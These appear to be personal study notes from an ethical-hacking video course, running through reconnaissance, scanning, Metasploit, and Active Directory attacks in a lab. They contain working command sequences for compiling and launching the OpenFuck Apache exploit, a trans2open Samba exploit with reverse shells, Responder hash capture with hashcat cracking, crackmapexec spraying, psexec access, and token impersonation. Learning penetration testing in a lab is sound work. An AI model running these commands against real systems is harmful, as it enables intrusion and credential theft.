systemctl
service
ifconfig
system
nmap
netstat lsof
note the linux scripts.
route command.
/etc/passwd
/etc/shadow

hosting a ftp and a server via python exposing the libraries on your desktop system:
pip install pyftpdlib
python -m pyftpdlib -p 21 w

python -m SimpleHTTPServer 80
stages of hacking:
1. reconnaissance - passive/ active (info gathering) - email list, geography.
2. scanning and enumeration - nmap, nessus, nikto, etc.
3. gaining access
4. maintaining access
5. covering tracks - psexec, you go via a shell. 

we must make sure the hosts we are looking at is actually their's.
WHOIS, nslookup, dnsrecon.
Google Fu, Nmap, Sublistr3, Bluto
https://youtu.be/3Kq1MIfTWCE?t=16579

OSINT tools.
bugcrowd.com
hunter.io - users.

https://youtu.be/3Kq1MIfTWCE?t=17145s
site:tesla.com filetype:pdf
theHarvester
what are subdomains?

incase bluto does not work https://youtu.be/3Kq1MIfTWCE?t=19143
check bluto github.
------------------------------------
what bluto does?
DNS Recon | Brute Forcer | DNS Zone Transfer | DNS Wild Card Checks | DNS Wild Card Brute Forcer | 
Email Enumeration | Staff Enumeration | Compromised Account Enumeration | MetaData Harvesting

theHarvester
pip install bluto
dig +short ns facebook.com
bluto
history

https://latesthackingnews.com/2018/09/20/dnsrecon-an-open-source-dns-enumeration-tool/
https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/
https://cr.yp.to/djbdns/axfr-notes.html
------------------------------------
Netscraft
crt.sh - %.tesla.com

Netscraft - what techs a site is using.
crt.sh - %.tesla.com - all the subdomains and domains come up.

Fingerprinting - take a data and map its origin.
wappalyzer extension - what frameworks, etc. the site is built on. 
check if those frameworks, etc. wok correct.
we are looking at network look at the host, thus focus on code exec 
mainly to break in network.
dont pentest a website, that is often not the scope.
 webapps and

whatweb -v tesla.com - what javascript fw, etc.
hackerone- bug bounty reports.
builtwith.com

brute forcing Sub-Domains
finding the breach password list.

>> we have now gathered a lot of info from the site.

Scanning and tools:
- stealth scanning with the nmap.
udp - dhcp
what is NAT?

slealth scan:
syn
syn ack
rst - we dont want jk.

nmap -T4 -A -p- 192.168.188.128

improving the nmap scan, we do a technique called staging:
nmap -T4 -p- 192.168.188.128 (break search in bits, not all blocks)
scan some ports:
nmap -T4 -A -p22,80 192.168.188.128

nmap -T4 -A -p22,80 192.168.188.128 -oA client
now you have:
Bluto  client.gnmap  client.nmap  client.xml

>> since they are bash commands, you may use these to build a linux 
script.

>> now scanning with udp. (dont forget to look).
nmap -sU -T4 192.168.188.128
ls /usr/share/nmap/scripts/ - all these scripts to detect 
vulnerablities, have a hunch and then run these scripts.

nmap -p 443 --script=ssl-enum-ciphers tesla.com ( what cyphers used 
on the other side).
https://youtu.be/3Kq1MIfTWCE?t=27660 

get nessus

/etc/init.d/nessusd start
localhost:8834

metasploit framework:
msfconsole (command)
https://youtu.be/3Kq1MIfTWCE?t=23026
type: 
search portscan
auxiliary/scanner/portscan/xmas 
options
search tomcat
https://youtu.be/3Kq1MIfTWCE?t=23388 segment.
use nessus to check your scan, and report to ppl that your pen test 
is beginning.

nikto -H
nikto -h https://testla.com
vulnerability scanning. 
burpsuite - website pentest.
https:/
Kq1MIfTWCE?t=24434

netdiscover -r <IP>/24

get kioptrix level 1. 
use it to hack your linux kali.
(watch the video).

get to HACK THE BOX.
-----------------------------------------
>> enumeration:
ifconfig
netdiscover -r 192.168.202.0/24 
(working on ARP scan - mac and simultaneous ip) 
ip of a router?
keepnotes - keep taking notes.

fire up nessus, currently at https://youtu.be/3Kq1MIfTWCE?t=25390
port scan, and known web vulnerabilities.
launch
https://youtu.be/3Kq1MIfTWCE?t=27660

we can do the nmap alongside.

https://youtu.be/3Kq1MIfTWCE?t=25676, some config change on nessux 
attempted.
Service detection - vulns in nessus what all are running.
mind false positives.
not enough enough tho, look at more details.
what are they running on ports? why why those?
RDP.
not to focus on what the headers etc look like.

look at the site, does it suggest poor hygeine.
Greenshot screenshot software.
apache address checkout - try nikto on it.

shows - server details, etc. but alot of it pertains to web pentest.
shows stuff like vulnerabilities, and what are outdated.


dirbuster -> we have a dataset, are those data on the web?
OWASP ?
https://youtu.be/3Kq1MIfTWCE?t=26797
sometimes you see data, again is a person be able to see it.

curl --head <ip>
server header info disclosure.
invert the picture. dark to white BG.

<http ip>/dsklfsidln
report the error page if its bad and generic like maybe.
disclosure

cve details; find on googling the vulns in the nessus.
or find details and report them.
<ip>/////////////////// something happens

searchsploit - local repo of exploit-db 
searchsploit apache 1.3.20 or 1.3
https://youtu.be/3Kq1MIfTWCE?t=28476

samba sw has vulns

smbclient -L \\\<ip>
https://youtu.be/3Kq1MIfTWCE?t=28865
lets you log in.

msfconsole
https://youtu.be/3Kq1MIfTWCE?t=29111

hackthebox:
https://youtu.be/3Kq1MIfTWCE?t=29563


httpd

https://youtu.be/3Kq1MIfTWCE?t=29902
https://youtu.be/3Kq1MIfTWCE?t=30330

netcat reverse shell. 
netcap - port listner or connector.
port 4444.
port forwrding

staged and non staged payloads.
https://youtu.be/3Kq1MIfTWCE?t=31320

bridged network and NAT.

  527  cd KioDir/
  528  git clone https://github.com/heltonWernik/OpenLuck.git
  529  apt-get install libssl-dev
  530  cd OpenLuck/
  531  ls
  532  gcc OpenFuck.c -o op -lcrypto
  533  ls
  534  ./op 
  535  ./op 0x6b 192.168.188.129
  536  ./op 0x6b 192.168.188.129 -c 40
  537  history

reverse shell.

1   search portscan
2   use auxiliary/scanner/portscan/xmas 
3   options
4   use auxiliary/scanner/portscan/syn
5   set ports 1-65535
6   set rhosts 1-65535
7   set rhosts 192.168.188.128 
8   run
9   exit
10  search samba
11  search apache
12  search smb_version
13  use auxiliary/scanner/smb/smb_version
14  info
15  history
16  options
17  set rhosts 192.168.188.129
18  run
19  history

10  search samba
11  search apache
12  search smb_version
13  use auxiliary/scanner/smb/smb_version
14  info
15  history
16  options
17  set rhosts 192.168.188.129
18  run
19  history
20  search trans2open
21  use exploit/linux/samba/trans2open
22  options
23  set rhosts 192.168.188.129
24  info
25  run
26  options
27  set payload linux/x86/
28  set payload linux/x86/meterpreter/reverse_tcp
29  run
30  set payload linux/x86/shell_reverse_tcp
31  run
32  history

>> you have a host running using openvpn.
synack.com // do a check.
capture the flag
router IP.

>>Credential Stuffing.
github breach-parse
-----------------------------------------
10 hour lapse:
password spraying
credential stuffing.

Active Directory (AD) is a Microsoft product that consists of 
several services that run on Windows Server to manage permissions 
and access to networked resources. Active Directory stores data as 
objects. An object is a single element, such as a user, group, 
application or device, such as a printer.
------------------------------------------
all the microsoft emails etc that we use, with our domain name the 
MS server keeps our creds going.
Check how MS server is made... forests and parent directories.
Review the Docker Toolbox.

smb
llmnr/ nbt-ns poisoning

share on a server.
tool called responder.

Kali
Responder.py
go to its dir.
runs scan, run when it can capture password, in the morning, post 
lunch, capture traffic.

python Responder.py -I eth0 -rdw

new tab
ifconfig (on kali)
take this ip, and https://youtu.be/3Kq1MIfTWCE?t=39459
copy the hash, though u cant login, still send in the hash.

(if you try on the windows pc and then see the capture)

try these mech and try to point these to yourselves.

note anything with conf abilities eg. a printer, it may have an smb 
share, stores passwords.

name:domain:<hash>
rockyou.txt , has a huge password wordlist

hashcat --help
-m : hash flag modes.
hashcat -m 5600 hash.txt /root/rockyou.txt --force
<paste your hash in the hashcat location? for proc constrains>
https://youtu.be/3Kq1MIfTWCE?t=40023

Defense strategy:
https://youtu.be/3Kq1MIfTWCE?t=40213
(view list)
cracking attack (respoder is the MIM listener).
assume u are in their network.
--------------------------------------------
week 9:
<read the homework links>
https://youtu.be/3Kq1MIfTWCE?t=41025
smb login turned off.

courses on pentest:
https://youtu.be/3Kq1MIfTWCE?t=41318
elearnsecurity.
hack the box, and offshore challenges.

do the share
log in as administrator, not as frank
windows defender often block this attack, so disable it.
exploit/windows/smb/psexec

lets back off.
apt install crackmapexec
crackmapexec smb 192.169.231.0/24 Administratir -p 'pa$$word' -d 
marvel
you now have access to the machines that match.

now at msfconsole:
options
set rhosts <the punisher machine>
set smbdomain marve;
set smbpass Password!
set smbuser fcastle
set targets
set target 2
run
set target 1
run
works!

sessions 1
(meterpreter)
load incongnito.
impersonate token.
delegation token.

domain controller?
must be configured to not be affected. 
kali
msfconsole
